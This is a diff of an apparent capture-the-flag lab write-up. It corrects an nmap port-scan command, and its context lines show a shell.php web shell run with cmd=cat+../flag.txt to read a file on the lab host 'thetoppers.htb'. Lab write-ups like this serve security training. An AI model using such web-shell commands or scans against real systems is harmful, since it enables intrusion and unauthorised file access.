@@ -8,7 +8,7 @@
 ## 1. Enumeration
 
 ```bash
-sudo nmap -p- -sS ---min-rate 5000 -T3 10.129.227.248
+sudo nmap -p- -sS --min-rate 5000 -T3 10.129.227.248
 ```
 
 `PORT   STATE SERVICE
@@ -69,5 +69,3 @@ Lets make it simpler, after uploading with aws we have to do the following:
 `http://thetoppers.htb/shell.php?cmd=cat+../flag.txt`
 
 Pwned.
-
-
